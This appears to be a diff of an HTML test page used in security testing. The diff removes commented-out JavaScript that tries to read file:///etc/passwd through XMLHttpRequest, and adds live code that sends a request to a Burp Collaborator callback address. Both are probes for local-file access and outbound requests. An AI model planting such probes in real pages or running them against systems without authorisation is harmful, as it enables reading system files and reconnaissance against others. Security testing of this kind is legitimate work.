@@ -3,21 +3,21 @@
 <head> 
 <script>
 //     var localfile = "file:///etc/passwd";
-//     var xhr = new XMLHttpRequest();
-//     xhr.onreadystatechange=function()
-//     {
-//         if(xhr.readyState == 4)
-//         {
-//             alert(xhr.responseText);
-//         }
-//     }
-//     try{
-//         xhr.open("GET", localfile, true);
-//         xhr.send();
-//     }catch(ex){
-//         alert(ex.message);
-//     }
-    alert("hello");
+    var localfile = "https://413en3fzle3l3w9ei88aaoxcz35tti.burpcollaborator.net";
+    var xhr = new XMLHttpRequest();
+    xhr.onreadystatechange=function()
+    {
+        if(xhr.readyState == 4)
+        {
+            alert(xhr.responseText);
+        }
+    }
+    try{
+        xhr.open("GET", localfile, true);
+        xhr.send();
+    }catch(ex){
+        alert(ex.message);
+    }
 </script>
 </head>
 </html>
